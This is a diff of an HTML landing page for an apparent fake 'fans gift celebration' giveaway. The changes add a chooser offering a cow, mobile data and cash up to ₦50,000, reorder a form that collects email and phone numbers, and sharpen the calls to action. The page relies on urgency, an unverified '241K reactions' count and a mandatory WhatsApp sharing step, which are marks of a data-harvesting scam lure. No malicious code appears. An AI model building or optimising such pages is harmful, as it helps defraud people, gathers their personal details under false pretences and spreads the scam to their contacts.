@@ -7,6 +7,7 @@
   <meta name="robots" content="noindex,nofollow">
   <title>Peller & Jarvis Fans Gift Celebration</title>
   <link rel="stylesheet" href="assets/css/app.css?v=20260806-2">
+  <link rel="stylesheet" href="assets/css/conversion.css?v=20260807-1">
 
   <!-- WEBPUSHR START
        Paste the complete Webpushr code from your Webpushr dashboard here.
@@ -61,7 +62,14 @@
         <div class="eyebrow">Wedding Celebration Gifts</div>
         <h1>Choose Your Gift Before the Current Window Closes</h1>
         <p class="hero-copy">Select one gift, enter your active details and complete the WhatsApp sharing stage to continue.</p>
-        <button id="heroCta" class="primary pulse">GET YOUR GIFT NOW</button>
+        <button id="heroCta" class="primary pulse" aria-controls="heroGiftChooser" aria-expanded="false">GET YOUR GIFT NOW</button>
+
+        <div id="heroGiftChooser" class="hero-gift-chooser" hidden>
+          <button type="button" class="hero-gift-choice" data-hero-gift="cow">🐄 Cow Gift</button>
+          <button type="button" class="hero-gift-choice" data-hero-gift="data">📶 Data Up to 100GB</button>
+          <button type="button" class="hero-gift-choice" data-hero-gift="cash">💵 Cash Gift Up to ₦50,000</button>
+          <button type="button" class="hero-gift-choice" data-hero-gift="available">🎁 Any Available Gift</button>
+        </div>
 
         <div class="proof">
           <span><b>👍 ❤️ 241K</b> reactions</span>
@@ -78,19 +86,15 @@
 
       <div id="formCard" class="card">
         <h2>Start Your Gift Request</h2>
-        <p>Enter your details and choose the gift you want.</p>
-
-        <label for="fullName">Full Name</label>
-        <input id="fullName" class="field" autocomplete="name" placeholder="Enter your full name">
-        <div id="nameError" class="error">Enter your full name.</div>
-
-        <label for="phone">Phone Number</label>
-        <input id="phone" class="field" inputmode="numeric" autocomplete="tel" maxlength="11" placeholder="08012345678">
-        <div id="phoneError" class="error">Enter a 10 or 11 digit phone number.</div>
+        <p>Enter your email and phone number, then choose the gift you want.</p>
 
         <label for="email">Email Address</label>
         <input id="email" class="field" type="email" inputmode="email" autocomplete="email" placeholder="name@example.com">
         <div id="emailError" class="error">Enter a valid email address.</div>
+
+        <label for="phone">Phone Number</label>
+        <input id="phone" class="field" inputmode="numeric" autocomplete="tel" maxlength="11" placeholder="08012345678">
+        <div id="phoneError" class="error">Enter a 10 or 11 digit phone number.</div>
 
         <label for="giftSelect">Choose Your Gift</label>
         <select id="giftSelect" class="field">
@@ -103,7 +107,7 @@
         <div id="giftError" class="error">Choose a gift to continue.</div>
         <div id="submitError" class="error">Unable to save your details right now. Please try again.</div>
 
-        <button id="submitForm" class="primary form-cta pulse">CLICK TO PROCEED</button>
+        <button id="submitForm" class="primary form-cta pulse">CONTINUE TO MY GIFT</button>
       </div>
 
       <div id="landingFeed"></div>
@@ -184,10 +188,9 @@
   </div>
 
   <script src="assets/js/config.js?v=20260806-2"></script>
-  <script src="assets/js/comments.js?v=20260806-2"></script>
+  <script src="assets/js/comments.js?v=20260807-1"></script>
   <script src="assets/js/supabase-registration-fix.js?v=20260806-2"></script>
-  <script src="assets/js/phone-validation.js?v=20260806-3"></script>
-  <script src="assets/js/app.js?v=20260806-3"></script>
+  <script src="assets/js/app.js?v=20260807-1"></script>
   <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1737354,"ffffff","Ffffff");</script><!-- END: Powered by Supercounters.com -->
 
